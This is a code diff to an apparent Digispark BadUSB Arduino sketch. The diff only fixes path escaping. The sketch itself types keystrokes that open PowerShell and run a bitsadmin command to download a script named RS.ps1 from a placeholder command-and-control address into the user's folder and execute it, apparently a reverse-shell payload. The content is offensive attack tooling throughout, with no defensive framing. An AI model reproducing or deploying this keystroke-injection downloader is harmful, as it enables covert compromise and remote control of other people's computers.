@@ -25,7 +25,7 @@ void loop() {
   DigiKeyboard.print("powershell"); // write powershell 
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
   delay(1000);
-  DigiKeyboard.print("bitsadmin /transfer C https://xx.xx.xx.xx/RS.ps1 C:\users\$env:UserName\important.ps1"); // repalce Xs with CnC IP/Domain to retrieve the payload over SSL
+  DigiKeyboard.print("bitsadmin /transfer C https://xx.xx.xx.xx/RS.ps1 C:\\users\\$env:UserName\\important.ps1"); // repalce Xs with CnC IP/Domain to retrieve the payload over SSL
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // execute the RS.ps1
   for (;;) {
     // stops re-execution // just remove the Digispark
